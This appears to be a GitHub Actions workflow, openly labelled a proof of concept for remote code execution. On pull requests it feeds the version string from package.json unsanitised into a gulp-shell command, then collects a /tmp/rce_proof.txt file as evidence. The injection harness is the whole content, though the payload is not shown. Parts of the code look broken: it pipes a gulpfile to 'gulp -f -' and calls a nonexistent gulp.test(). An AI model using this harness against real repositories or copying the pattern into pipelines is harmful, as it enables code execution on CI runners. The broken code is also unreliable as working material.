---
name: PoC RCE Demonstration
on:
  pull_request:
    branches: [main]
  workflow_dispatch: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '12'
      - name: Install dependencies
        run: |
          npm install gulp@3.9.1
          npm install gulp-shell@0.8.0
      - name: Debug environment
        run: |
          echo "Node version:" && node --version
          echo "NPM packages:" && npm list gulp gulp-shell
          echo "Package version:" && node -p "require('./package.json').version"
      - name: Run direct command injection test
        run: |
          version=$(node -p "require('./package.json').version")
          echo "Testing command injection with version: $version"
          script="gulp.task('test', () => require('gulp-shell').task('echo $version')()); gulp.test();"
          npx gulp -f - <<< "$script" || echo "Gulp task failed; check RCE output"
      - name: Check for proof file
        run: |
          if [ -f /tmp/rce_proof.txt ]; then
            echo "Proof file found:" && cat /tmp/rce_proof.txt
          else
            echo "No proof file found (sandbox restriction)"
          fi
      - name: Upload proof artifact
        uses: actions/upload-artifact@v4
        with:
          name: rce-proof
          path: /tmp/rce_proof.txt
